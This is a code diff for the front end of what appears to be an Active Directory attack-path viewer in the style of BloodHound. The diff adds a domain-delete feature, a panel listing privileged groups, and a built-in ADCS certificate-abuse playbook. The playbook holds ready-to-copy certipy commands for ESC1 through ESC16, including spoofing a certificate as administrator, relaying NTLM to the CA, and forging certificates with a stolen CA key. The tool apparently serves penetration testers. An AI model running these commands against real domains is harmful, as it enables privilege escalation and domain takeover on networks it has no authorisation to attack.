@@ -116,7 +116,7 @@ function renderDomains() {
   }
   list.innerHTML = domains.map((d) => `
     <article class="domain-card" data-id="${d.id}">
-      <div>
+      <div class="domain-card__body">
         <h3>${esc(d.name)}</h3>
         <p>${esc(d.source || "BloodHound import")} · ${new Date(d.created_at * 1000).toLocaleString()}</p>
       </div>
@@ -124,9 +124,32 @@ function renderDomains() {
         <span class="pill">${d.node_count} nodes</span>
         <span class="pill">${d.edge_count} edges</span>
       </div>
+      <button class="domain-del" data-id="${d.id}" data-name="${esc(d.name)}" title="Delete this graph from the database">🗑</button>
     </article>
   `).join("");
-  $$(".domain-card").forEach((el) => el.addEventListener("click", () => openDomain(+el.dataset.id)));
+  $$(".domain-card").forEach((el) => el.addEventListener("click", (ev) => {
+    if (ev.target.closest(".domain-del")) return;   // let the delete button handle its own click
+    openDomain(+el.dataset.id);
+  }));
+  $$(".domain-del").forEach((btn) => btn.addEventListener("click", (ev) => {
+    ev.stopPropagation();
+    deleteDomain(+btn.dataset.id, btn.dataset.name);
+  }));
+}
+
+function deleteDomain(id, name) {
+  if (!confirm(`Delete "${name}" from the database?\n\nThis removes all its nodes, edges and owned marks. This cannot be undone.`)) return;
+  api(`/api/domain/${id}`, { method: "DELETE" })
+    .then((r) => {
+      toast(`Deleted ${r.deleted || name}`);
+      if (active && active.id === id) {   // if it's open, bail back to the domain list
+        active = null;
+        $("#app").classList.add("hidden");
+        $("#welcome").classList.remove("hidden");
+      }
+      loadDomains();
+    })
+    .catch((e) => toast(`Delete failed: ${e.message}`));
 }
 
 async function openDomain(id) {
@@ -447,17 +470,19 @@ function hexA(hex, alpha) {
 }
 
 function drawGrid() {
-  const step = 42 * scale;
-  if (step < 14) return;
+  // Soft dot-grid instead of hard square lines — reads as depth, not a spreadsheet.
+  const step = 46 * scale;
+  if (step < 18) return;
   ctx.save();
-  ctx.strokeStyle = "rgba(255,255,255,.035)";
-  ctx.lineWidth = 1;
   const ox = tx % step, oy = ty % step;
+  const r = Math.max(0.7, Math.min(1.5, 0.9 * scale));
+  ctx.fillStyle = "rgba(150,180,220,.06)";
   for (let x = ox; x < innerWidth; x += step) {
-    ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, innerHeight); ctx.stroke();
-  }
-  for (let y = oy; y < innerHeight; y += step) {
-    ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(innerWidth, y); ctx.stroke();
+    for (let y = oy; y < innerHeight; y += step) {
+      ctx.beginPath();
+      ctx.arc(x, y, r, 0, Math.PI * 2);
+      ctx.fill();
+    }
   }
   ctx.restore();
 }
@@ -703,6 +728,7 @@ function openPanel(idx) {
     $(".owned-toggle")?.addEventListener("click", () => toggleOwned(detail.id));
     $$(".graph-rel").forEach((b) => b.addEventListener("click", () => focusGraph(detail.id, b.dataset.rel)));
     $$(".ptab").forEach((b) => b.addEventListener("click", () => switchPanelTab(b.dataset.tab)));
+    $$("#panelBody [data-goto]").forEach((el) => el.addEventListener("click", () => focusGraph(el.dataset.goto, "all")));
   }).catch((e) => $("#panelBody").innerHTML = `<div class="empty">${esc(e.message)}</div>`);
 }
 
@@ -717,9 +743,74 @@ function closePanel() {
   requestDraw();
 }
 
+function renderViaTrail(via) {
+  if (!via || !via.length) return "";
+  const steps = via.map((s) =>
+    `<span class="via-step">${esc(s.via)}</span><span class="via-sep">·</span><span class="via-grp">${esc(short(s.group, 22))}</span>`
+  ).join(`<span class="via-sep">→</span>`);
+  return `<div class="via"><span class="via-label">via</span>${steps}</div>`;
+}
+
+function escBadge(e) {
+  return e && e.esc ? ` <span class="esc-badge" title="${esc(e.escDesc || "")}">${esc(e.esc)}</span>` : "";
+}
+
+function renderGroupCompact(e) {
+  return `<div class="edge-row hot delegated"><div><b>${esc(e.right)}</b>${escBadge(e)} → ${esc(e.targetLabel)}</div><small>${esc(e.targetType || "")}</small>${renderViaTrail(e.via)}</div>`;
+}
+
+function renderGroupAbuse(e) {
+  return `
+    <div class="edge-row delegated">
+      <div><b>${esc(e.right)}</b>${escBadge(e)} → ${esc(e.targetLabel)}</div>
+      <small>${esc(e.targetType)}</small>
+      ${renderViaTrail(e.via)}
+      ${(e.abuse || []).map((a) => `
+        <div class="cmd">
+          <div class="cmd__head"><span><i class="os-badge ${esc(a.os)}">${esc(a.os)}</i> · ${esc(a.tool)}</span><button class="copy" data-cmd="${esc(a.cmd)}">copy</button></div>
+          <pre>${colorCommand(a.cmd)}</pre>
+        </div>
+      `).join("")}
+    </div>
+  `;
+}
+
+// Groups whose membership is itself a capability worth calling out — access or
+// privilege that no ACL edge represents, so it would otherwise hide in the
+// "member of" list (e.g. Remote Management Users → WinRM).
+const NOTABLE_GROUPS = {
+  "remote management users": "WinRM / PSRemote where the group is local",
+  "remote desktop users": "RDP access",
+  "protected users": "hardened — no NTLM/delegation, use Kerberos",
+  "administrators": "local admin on the host",
+  "domain admins": "full domain control",
+  "enterprise admins": "forest-wide control",
+  "schema admins": "AD schema control",
+  "account operators": "manage most users/groups",
+  "backup operators": "read SAM/NTDS via SeBackup",
+  "server operators": "control DC services & shares",
+  "print operators": "load drivers / SeLoadDriver on DCs",
+  "dnsadmins": "DLL as SYSTEM on the DNS server",
+  "group policy creator owners": "create & link GPOs",
+  "cert publishers": "publish certificates to AD",
+  "distributed com users": "DCOM lateral movement",
+};
+
+function renderMemberOf(out) {
+  const groups = out.filter((e) => (e.right || "").toLowerCase() === "memberof");
+  if (!groups.length) return "";
+  const rows = groups.map((e) => {
+    const gk = (e.targetLabel || "").split("@")[0].toLowerCase();
+    const note = NOTABLE_GROUPS[gk];
+    return `<div class="mo${note ? " hot" : ""}" data-goto="${esc(e.target)}"><b>${esc(e.targetLabel)}</b>${note ? `<span class="mo-note">${esc(note)}</span>` : ""}</div>`;
+  }).join("");
+  return `<div class="section-title">Member of <span class="count">${groups.length}</span></div><div class="memberof">${rows}</div>`;
+}
+
 function renderPanel(n) {
   const out = n.outgoing || [];
   const inc = n.incoming || [];
+  const gd = n.groupDelegated || [];
   const props = Object.entries(n.props || {}).filter(([, v]) => v !== null && v !== "" && !(Array.isArray(v) && !v.length));
   const abuseOut = out.filter((e) => e.abusable);
   const abuseIn = inc.filter((e) => e.abusable);
@@ -753,23 +844,27 @@ function renderPanel(n) {
         <div><b>${inc.length}</b><span>Inbound</span></div>
         <div><b>${abuseOut.length}</b><span>Can abuse</span></div>
         <div><b>${abuseIn.length}</b><span>Can be abused</span></div>
+        ${gd.length ? `<div class="via-metric"><b>${gd.length}</b><span>Via groups</span></div>` : ""}
       </div>
+      ${renderMemberOf(out)}
       <div class="section-title">Top properties</div>
       <div class="props">
         ${props.slice(0, 14).map(([k, v]) => `<div class="prop"><b>${esc(k)}</b><span>${esc(formatProp(v))}</span></div>`).join("") || `<div class="empty">No object properties were present in the import.</div>`}
       </div>
     </section>
     <section class="tabpage" data-page="edges">
-      <div class="section-title">Abuse from this node</div>
-      ${abuseOut.slice(0, 40).map(renderCompactEdge).join("") || `<div class="empty">No directly abusable outbound rights mapped.</div>`}
+      <div class="section-title">Direct abusable rights</div>
+      ${abuseOut.slice(0, 40).map(renderCompactEdge).join("") || `<div class="empty">None held directly by this principal.</div>`}
+      ${gd.length ? `<div class="section-title">⛌ Abuse via groups &amp; OU control <span class="count">${gd.length}</span></div>${gd.slice(0, 40).map(renderGroupCompact).join("")}` : ""}
       <div class="section-title">Who can take this over</div>
       ${abuseIn.slice(0, 45).map((e) => renderCompactEdge(e, true)).join("") || `<div class="empty">No inbound takeover edges in the loaded view.</div>`}
       <div class="section-title">Other outbound connections</div>
       ${out.filter((e) => !e.abusable).slice(0, 45).map(renderCompactEdge).join("") || `<div class="empty">No other outbound connections.</div>`}
     </section>
     <section class="tabpage" data-page="commands">
-      <div class="section-title">Commands generated from outbound abuse</div>
+      <div class="section-title">Commands — directly held rights</div>
       ${abuseOut.slice(0, 30).map(renderAbuseEdge).join("") || `<div class="empty">No commands available for this object.</div>`}
+      ${gd.length ? `<div class="section-title">Commands — via groups &amp; OU control</div>${gd.slice(0, 30).map(renderGroupAbuse).join("")}` : ""}
     </section>
     <section class="tabpage" data-page="raw">
       <div class="section-title">All imported properties</div>
@@ -784,13 +879,13 @@ function renderCompactEdge(e, reverse = false) {
   const name = reverse ? e.sourceLabel : e.targetLabel;
   const type = reverse ? e.sourceType : e.targetType;
   const arrow = reverse ? "←" : "→";
-  return `<div class="edge-row ${e.abusable ? "hot" : ""}"><div><b>${esc(e.right)}</b> ${arrow} ${esc(name)}</div><small>${esc(type || "")}</small></div>`;
+  return `<div class="edge-row ${e.abusable ? "hot" : ""}"><div><b>${esc(e.right)}</b>${escBadge(e)} ${arrow} ${esc(name)}</div><small>${esc(type || "")}</small></div>`;
 }
 
 function renderAbuseEdge(e) {
   return `
     <div class="edge-row">
-      <div><b>${esc(e.right)}</b> → ${esc(e.targetLabel)}</div>
+      <div><b>${esc(e.right)}</b>${escBadge(e)} → ${esc(e.targetLabel)}</div>
       <small>${esc(e.targetType)}</small>
       ${(e.abuse || []).map((a) => `
         <div class="cmd">
@@ -958,6 +1053,162 @@ $("#drop").addEventListener("drop", (ev) => {
   $("#zipInput").files = dt.files;
   $("#importStatus").textContent = file.name;
 });
+
+// --- ADCS / ESC certificate-abuse playbook --------------------------------
+// A curated certipy cheatsheet, every well-known ESC with find + exploit + auth.
+// Placeholders (<ca>, <template>, <dc-ip>, <user>) are filled by the operator;
+// {domain} is substituted live from the active domain.
+const ADCS_PLAYBOOK = [
+  { id: "FIND", name: "Enumerate vulnerable templates", tag: "recon",
+    cmds: [
+      "certipy find -u '<user>@{domain}' -p '<pass>' -dc-ip <dc-ip> -vulnerable -stdout",
+      "certipy find -u '<user>@{domain}' -hashes <nthash> -dc-ip <dc-ip> -vulnerable -enabled -stdout",
+    ] },
+  { id: "ESC1", name: "Enrollee supplies subject + client-auth EKU (SAN spoof)", tag: "template",
+    cmds: [
+      "certipy req -u '<user>@{domain}' -p '<pass>' -dc-ip <dc-ip> -ca <ca> -template <template> -upn administrator@{domain}",
+      "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>",
+    ] },
+  { id: "ESC2", name: "Any Purpose / SubCA EKU template", tag: "template",
+    cmds: [
+      "certipy req -u '<user>@{domain}' -p '<pass>' -dc-ip <dc-ip> -ca <ca> -template <template>",
+      "# use the cert as an enrollment agent (see ESC3) or for any client-auth",
+      "certipy auth -pfx <cert>.pfx -dc-ip <dc-ip>",
+    ] },
+  { id: "ESC3", name: "Enrollment Agent template", tag: "template",
+    cmds: [
+      "certipy req -u '<user>@{domain}' -p '<pass>' -dc-ip <dc-ip> -ca <ca> -template <agent-template>",
+      "certipy req -u '<user>@{domain}' -p '<pass>' -dc-ip <dc-ip> -ca <ca> -template User -pfx <agent>.pfx -on-behalf-of '{domain}\\administrator'",
+      "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>",
+    ] },
+  { id: "ESC4", name: "Vulnerable template ACL (write) → make it ESC1", tag: "acl",
+    cmds: [
+      "certipy template -u '<user>@{domain}' -p '<pass>' -dc-ip <dc-ip> -template <template> -write-default-configuration -save-old",
+      "certipy req -u '<user>@{domain}' -p '<pass>' -dc-ip <dc-ip> -ca <ca> -template <template> -upn administrator@{domain}",
+      "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>",
+      "# restore afterwards:  certipy template ... -configuration <template>.json",
+    ] },
+  { id: "ESC5", name: "Vulnerable PKI object ACL (CA host / CA object / PKI containers)", tag: "acl",
+    cmds: [
+      "# A dangerous ACL on a PKI object (the CA computer, the CA AD object, or the",
+      "# Public Key Services containers). Take the object over, then abuse as ESC7.",
+      "certipy find -u '<user>@{domain}' -p '<pass>' -dc-ip <dc-ip> -stdout   # inspect CA + host ACLs",
+      "# e.g. shadow-creds / RBCD the CA host, or rewrite the flags, then ESC6/ESC7.",
+    ] },
+  { id: "ESC6", name: "CA has EDITF_ATTRIBUTESUBJECTALTNAME2 (SAN on any template)", tag: "ca",
+    cmds: [
+      "certipy req -u '<user>@{domain}' -p '<pass>' -dc-ip <dc-ip> -ca <ca> -template User -upn administrator@{domain}",
+      "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>",
+    ] },
+  { id: "ESC7", name: "ManageCA / ManageCertificates rights on the CA", tag: "ca",
+    cmds: [
+      "certipy ca -u '<user>@{domain}' -p '<pass>' -dc-ip <dc-ip> -ca <ca> -add-officer <user>",
+      "certipy ca -u '<user>@{domain}' -p '<pass>' -dc-ip <dc-ip> -ca <ca> -enable-template SubCA",
+      "certipy req -u '<user>@{domain}' -p '<pass>' -dc-ip <dc-ip> -ca <ca> -template SubCA -upn administrator@{domain}   # fails, note the request id",
+      "certipy ca -u '<user>@{domain}' -p '<pass>' -dc-ip <dc-ip> -ca <ca> -issue-request <req-id>",
+      "certipy req -u '<user>@{domain}' -p '<pass>' -dc-ip <dc-ip> -ca <ca> -retrieve <req-id>",
+    ] },
+  { id: "ESC8", name: "NTLM relay to AD CS web enrollment (HTTP)", tag: "relay",
+    cmds: [
+      "certipy relay -target 'http://<ca-host>' -template DomainController",
+      "# coerce the target with PetitPotam/Coercer, then:",
+      "certipy auth -pfx <dc>.pfx -dc-ip <dc-ip>",
+    ] },
+  { id: "ESC9", name: "No security extension (szOID_NTDS_CA_SECURITY_EXT) + weak mapping", tag: "template",
+    cmds: [
+      "certipy account -u '<user>@{domain}' -p '<pass>' -dc-ip <dc-ip> update -user <victim> -upn administrator@{domain}",
+      "certipy req -u '<victim>@{domain}' -p '<pass>' -dc-ip <dc-ip> -ca <ca> -template <template>",
+      "certipy account -u '<user>@{domain}' -p '<pass>' -dc-ip <dc-ip> update -user <victim> -upn <victim>@{domain}   # revert",
+      "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>",
+    ] },
+  { id: "ESC10", name: "Weak certificate mapping (registry: no strong mapping)", tag: "config",
+    cmds: [
+      "certipy account -u '<user>@{domain}' -p '<pass>' -dc-ip <dc-ip> update -user <victim> -upn administrator@{domain}",
+      "certipy req -u '<victim>@{domain}' -p '<pass>' -dc-ip <dc-ip> -ca <ca> -template User",
+      "certipy auth -pfx administrator.pfx -dc-ip <dc-ip> -ldap-shell",
+    ] },
+  { id: "ESC11", name: "NTLM relay to ICPR RPC (no encryption enforced)", tag: "relay",
+    cmds: [
+      "certipy relay -target 'rpc://<ca-host>' -template DomainController",
+      "certipy auth -pfx <dc>.pfx -dc-ip <dc-ip>",
+    ] },
+  { id: "ESC12", name: "Shell / HSM access to the CA → export key & forge (Golden Cert)", tag: "ca",
+    cmds: [
+      "# Shell on the CA host: export the CA private key (certsrv backup, or a",
+      "# YubiHSM whose auth key is the default 0x0001 / password 'password').",
+      "certipy forge -ca-pfx ca.pfx -upn administrator@{domain} -out administrator_forged.pfx",
+      "certipy auth -pfx administrator_forged.pfx -dc-ip <dc-ip>",
+    ] },
+  { id: "ESC13", name: "Issuance policy linked to a privileged group", tag: "template",
+    cmds: [
+      "certipy req -u '<user>@{domain}' -p '<pass>' -dc-ip <dc-ip> -ca <ca> -template <template>",
+      "certipy auth -pfx <cert>.pfx -dc-ip <dc-ip>   # cert carries the group's OID",
+    ] },
+  { id: "ESC14", name: "Write access to altSecurityIdentities (weak explicit mapping)", tag: "acl",
+    cmds: [
+      "# You can write altSecurityIdentities on <target>. Map it to a cert you own,",
+      "# then authenticate as <target> with that certificate.",
+      "bloodyAD -u '<user>' -p '<pass>' -d {domain} --host <dc> set object <target> altSecurityIdentities -v 'X509:<I>DC=htb...<S>...'",
+      "certipy auth -pfx <yourcert>.pfx -username <target> -domain {domain} -dc-ip <dc-ip>",
+    ] },
+  { id: "ESC15", name: "EKUwu — v1 schema application policies (CVE-2024-49019)", tag: "template",
+    cmds: [
+      "certipy req -u '<user>@{domain}' -p '<pass>' -dc-ip <dc-ip> -ca <ca> -template <v1-template> -upn administrator@{domain} -application-policies 'Client Authentication'",
+      "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>",
+    ] },
+  { id: "ESC16", name: "Security extension disabled CA-wide", tag: "ca",
+    cmds: [
+      "certipy account -u '<user>@{domain}' -p '<pass>' -dc-ip <dc-ip> update -user <victim> -upn administrator@{domain}",
+      "certipy req -u '<victim>@{domain}' -p '<pass>' -dc-ip <dc-ip> -ca <ca> -template User",
+      "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>",
+    ] },
+];
+
+function renderAdcs(filter = "") {
+  const dom = (active && active.name) ? active.name : "domain.local";
+  $("#adcsDomain").textContent = dom;
+  const f = filter.toLowerCase();
+  const cards = ADCS_PLAYBOOK.filter((e) =>
+    !f || (e.id + " " + e.name + " " + e.tag).toLowerCase().includes(f)
+  ).map((e) => `
+    <div class="esc">
+      <div class="esc__head"><span class="esc__id">${esc(e.id)}</span><span class="esc__name">${esc(e.name)}</span><span class="esc__tag">${esc(e.tag)}</span></div>
+      ${e.cmds.map((c) => {
+        const cmd = c.replace(/\{domain\}/g, dom);
+        if (cmd.trim().startsWith("#")) return `<div class="esc__note">${esc(cmd)}</div>`;
+        return `<div class="cmd"><div class="cmd__head"><span><i class="os-badge linux">linux</i> · certipy</span><button class="copy" data-cmd="${esc(cmd)}">copy</button></div><pre>${colorCommand(cmd)}</pre></div>`;
+      }).join("")}
+    </div>
+  `).join("");
+  $("#adcsBody").innerHTML = cards || `<div class="empty">No ESC matches "${esc(filter)}".</div>`;
+  $$("#adcsBody .copy").forEach((b) => b.addEventListener("click", () => copyText(b.dataset.cmd)));
+}
+
+function openAdcs() {
+  renderAdcs($("#adcsFilter").value || "");
+  $("#adcsModal").classList.remove("hidden");
+}
+function closeAdcs() { $("#adcsModal").classList.add("hidden"); }
+
+$("#adcsBtn").addEventListener("click", openAdcs);
+$("#adcsFilter").addEventListener("input", (e) => renderAdcs(e.target.value));
+$$('[data-close="adcs"]').forEach((el) => el.addEventListener("click", closeAdcs));
+$("#adcsJson").addEventListener("change", (ev) => {
+  const file = ev.target.files[0];
+  ev.target.value = "";
+  if (!file) return;
+  if (!active) { toast("Open a domain first, then load its certipy JSON"); return; }
+  const fd = new FormData();
+  fd.append("json", file);
+  api(`/api/domain/${active.id}/adcs`, { method: "POST", body: fd })
+    .then((r) => {
+      toast(`ADCS: ${r.templates} vulnerable template(s) · ${r.edges} ESC edge(s) mapped`);
+      loadStats();
+      if (view !== "none" || focusSid) loadGraph($("#searchInput").value || "");
+    })
+    .catch((e) => toast(`certipy import failed: ${e.message}`));
+});
+addEventListener("keydown", (ev) => { if (ev.key === "Escape") closeAdcs(); });
 
 $("#refreshDomains").addEventListener("click", loadDomains);
 $("#backBtn").addEventListener("click", () => {
